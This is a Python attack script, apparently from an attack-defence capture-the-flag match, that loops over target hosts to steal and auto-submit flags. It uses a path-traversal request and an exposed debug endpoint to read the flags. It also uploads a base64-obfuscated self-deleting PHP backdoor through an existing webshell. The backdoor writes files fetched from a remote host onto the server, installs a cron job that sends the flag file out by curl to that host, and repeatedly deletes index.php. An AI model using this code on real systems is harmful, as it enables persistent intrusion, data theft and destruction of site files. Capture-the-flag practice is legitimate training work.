from lib.parseburplog import parseburprequest
from core.common import repeat
from core.data import conf
from lib.submit_flag import submit_flag
import requests
from core.data import *
import re
import base64
import time


def getflag():  #获取flag并自动提交，可通过webshell来获取flag
    getflag2()
    getflag3()


def getflag2():
    uri = "/mc-admin/index.php?file=../../../../../../flag.txt"  # shell地址
    header = {
        # "Content-Type": "application/x-www-form-urlencoded",
        # "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0",
        # "cookie": ""
    }
    #data = "pass=WJdhNWqs&cmd=system('cat /flag');"
    with open('web_targets.txt', 'r') as f:
        targets = f.readlines()
        for target in targets:
            target = target.strip()
            url = "http://" + target + uri
            try:
                #res = requests.post(url, headers=header, data=data, timeout=2)


                res = requests.get(url, headers=header, timeout=2)
                a = re.search(r'<img.*', res.text)
                c = a.group()
                b = c.split(',')
                d = b[1].strip('">')
                d = d.strip(" ")

                e = base64.b64decode(d).decode()


                submit_flag(e)
            except Exception as f:
                print(url + "\t请求失败\n")

                continue

def getflag3():
    uri = ":8081/admin/logs/debug?debugfile=flag"  # shell地址
    header = {
        # "Content-Type": "application/x-www-form-urlencoded",
        # "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0",
        # "cookie": ""
    }
    #data = "pass=WJdhNWqs&cmd=system('cat /flag');"
    with open('web_targets.txt', 'r') as f:
        targets = f.readlines()
        for target in targets:
            target = target.strip()
            url = "http://" + target + uri
            try:
                #res = requests.post(url, headers=header, data=data, timeout=2)


                res = requests.get(url, headers=header, timeout=2)

                submit_flag(res.text)
            except Exception as f:
                print(url + "\t请求失败\n")

                continue
def webshell():   #上传webshell(命令执行)
    uri = "/shell.php"
    header = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0",
        "Referer": ''''''
    }
    #自定义不死马
    poc = 'echo "PD9waHAgCglzZXRfdGltZV9saW1pdCgwKTsKCWVycm9yX3JlcG9ydGluZygwKTsKCXVubGluayhfX0ZJTEVfXyk7Cgl3aGlsZSgxKXsKCQlmaWxlX3B1dF9jb250ZW50cyhmaWxlX2dldF9jb250ZW50cygnaHR0cDovLzEwLjIxMS41NS4yOjg4ODgvbmFtZS50eHQnKSxmaWxlX2dldF9jb250ZW50cygnaHR0cDovLzEwLjIxMS41NS4yOjg4ODgvdGV4dC50eHQnKSk7CgkJJG1lc3NhZ2U9IiogKiAqICogKiBjdXJsIDEwLjIxMS41NS4yOjg4ODgvPyQoY2F0IC9mbGFnKSI7CgkJCgkJc3lzdGVtKCJlY2hvICckbWVzc2FnZScgPiAvdG1wLzEgOyIpOwoJCQoJCXN5c3RlbSgiY3JvbnRhYiAvdG1wLzE7Iik7CgkJCgkJc2xlZXAoMzApOwoJCSRmaWxlID0gJy92YXIvd3d3L2h0bWwvaW5kZXgucGhwJzsKCQlpZihmaWxlX2V4aXN0cygkZmlsZSkpewoJCQl1bmxpbmsoJGZpbGUpOwoJCX0KCX0KPz4=" |base64 -d >>/var/www/html/cc.php'
    with open('web_targets.txt', 'r') as f:
        targets = f.readlines()

        for target in targets:
            target = target.strip()
            url = "http://" + target + uri
            data = "a=system('{}');".format(poc)
            res = requests.post(url, headers=header, data=data)
            #触发后请求不死马生成新的后门
            url2 = "http://" + target + "/cc.php"
            try:
                time.sleep(1)
                res2 = requests.get(url2, timeout=3)
            except Exception as f:
                pass
            url3 = "http://" + target + "/.-35.php"
            try:
                res3 = requests.get(url3, timeout=1)
                if res3.status_code == 200:
                    print(target + '上传shell成功：' + url3)
                else:
                    print(target + "webshell上传失败")
            except Exception as e:
                print(target + "上传失败！")
                pass

